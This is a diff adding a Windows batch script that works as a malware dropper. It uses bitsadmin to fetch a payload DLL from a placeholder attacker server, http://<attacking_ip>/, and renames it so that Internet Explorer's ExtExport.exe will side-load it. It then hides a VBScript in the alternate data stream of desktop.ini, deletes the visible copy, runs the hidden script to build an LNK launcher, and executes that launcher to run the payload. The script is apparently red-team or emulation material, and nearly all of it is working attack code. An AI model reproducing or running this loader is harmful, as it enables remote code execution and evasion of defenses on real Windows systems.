@@ -1,0 +1,55 @@
+@echo off
+
+setlocal enabledelayedexpansion
+
+set SERVER=http://<attacking_ip>/
+
+set PATH_PUBLIC_DIR=C:\Users\Public\Libraries\raw\
+rem Create the target directoty if it does not exist.
+if not exist "%PATH_PUBLIC_DIR%" mkdir %PATH_PUBLIC_DIR%
+
+set PAYLOAD_DLL=payload.dll
+set TARGET_ADS=desktop.ini
+set LAUNCHER_LNK=launcher.lnk
+set LAUNCHER_CREATE_VBS=launcher_create.vbs
+
+set URL_PAYLOAD_DLL=%SERVER%%PAYLOAD_DLL%
+
+rem ExtExport.exe looks for any DLL with the following names.
+set EXTEXPORT_DLLS[1]=mozcrt19.dll
+set EXTEXPORT_DLLS[2]=mozsqlite3.dll
+set EXTEXPORT_DLLS[3]=sqlite3.dll
+
+rem Select one DLL filename at random.
+set /a _rand=%RANDOM% %% 3 + 1
+set EXTEXPORT_DLL=!EXTEXPORT_DLLS[%_rand%]!
+
+set PATH_EXTEXPORT_DLL=%PATH_PUBLIC_DIR%%EXTEXPORT_DLL%
+set PATH_LAUNCHER_LNK=%PATH_PUBLIC_DIR%%LAUNCHER_LNK%
+set PATH_LAUNCHER_CREATE_VBS=%PATH_PUBLIC_DIR%%LAUNCHER_CREATE_VBS%
+
+set PATH_LAUNCHER_CREATE_ADS=%PATH_PUBLIC_DIR%%TARGET_ADS%:%LAUNCHER_CREATE_VBS%
+
+set PATH_EXTEXPORT_EXE=C:\Program Files (x86)\Internet Explorer\Extexport.exe
+set EXTEXPORT_ARGS=C:\Users\Public\Libraries\raw foo bar
+
+rem Download the renamed DLL payload from the server.
+bitsadmin /transfer 2 /priority FOREGROUND %URL_PAYLOAD_DLL% %PATH_EXTEXPORT_DLL%
+
+rem Use a temporary VBScript to create the LNK launcher.
+rem The launcher will take the renamed DLL payload and load it using ExtExport.
+echo Set oWS = WScript.CreateObject("WScript.Shell") > %PATH_LAUNCHER_CREATE_VBS%
+echo sLinkFile = "%PATH_LAUNCHER_LNK%" >> %PATH_LAUNCHER_CREATE_VBS%
+echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %PATH_LAUNCHER_CREATE_VBS%
+echo oLink.TargetPath = "%PATH_EXTEXPORT_EXE%" >> %PATH_LAUNCHER_CREATE_VBS%
+echo oLink.Arguments = "%EXTEXPORT_ARGS%" >> %PATH_LAUNCHER_CREATE_VBS%
+echo oLink.Save >> %PATH_LAUNCHER_CREATE_VBS%
+
+rem Copy the launcher creation VBScript to the Alternate Data Stream (ADS) of desktop.ini and erase it.
+type %PATH_LAUNCHER_CREATE_VBS% > %PATH_LAUNCHER_CREATE_ADS% && erase %PATH_LAUNCHER_CREATE_VBS%
+
+rem Execute the launcher creation VBScript from the Alternate Data Stream (ADS).
+cscript %PATH_LAUNCHER_CREATE_ADS%
+
+rem Execute the LNK launcher. This will use ExtExport.exe to side load and execute the DLL payload.
+start /b %PATH_LAUNCHER_LNK%
